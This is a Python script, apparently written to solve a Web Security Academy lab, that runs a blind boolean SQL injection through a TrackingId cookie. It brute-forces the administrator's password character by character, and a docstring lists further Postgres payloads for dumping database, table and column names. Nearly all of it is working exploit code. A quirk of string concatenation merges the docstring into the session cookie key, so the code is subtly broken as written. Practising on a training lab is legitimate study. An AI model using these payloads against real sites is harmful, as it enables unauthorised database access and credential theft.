#!/usr/bin/python3

import string, requests, sys, signal
from pwn import log

# Ctrl + C
def signal_handler(signal, frame):
    print("\n[!] Exiting ...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

# Global Variables
char_pool = string.ascii_lowercase + string.digits # string.printable would be optimal
main_url = "https://0aea009f037e7000801ddaab00a900f7.web-security-academy.net" # CHANGE THIS

def bruteForce():
    result=""

    p1 = log.progress("Brute Force")
    p1.status("Starting brute force attack")
    p2 = log.progress("Result")

    found = False
    index = 1
    while not found:
        for char in char_pool:
            custom_cookies = { # injectable field (CHANGE COOKIES)
                    "TrackingId": f"Xa5MpixG2VNuLJtG' and (select substring(password,{index},1) from users where username='administrator' limit 1)='{char}'-- -",
                    """ *Postgres*
                    To dump all databases: ' and (select substring(string_agg(datname, ','),{index},1) from pg_database)='{char}'-- -
                    To dump all tables:  and (select substring(string_agg(table_name, ','),{index},1) from information_schema.tables [where table_schema='public'])='{char}'-- -
                    To dump all columns: ' and (select substring(string_agg(column_name, ','),{index},1) from information_schema.columns where table_name='users')='{char}'-- -
                    """
                    "session": "OWOYC57WEb2u92Fel8aKaAT3TS9MlB65"
                    }
            p1.status(custom_cookies["TrackingId"])

            response = requests.get(main_url, cookies=custom_cookies)
            if "Welcome back!" in response.text:
                result += char
                p2.status(result)
                break
        else:
            found = True # when the for loops thru all chars and doesn't find a match, we assume the string ended
        index+=1
    return result

if __name__ == "__main__":
    result = bruteForce()
    print(f"\n[!] Found: {result}\n[!] Writing to a file...")
    with open("output.txt", "a") as f:
        f.write(f"{result}\n")
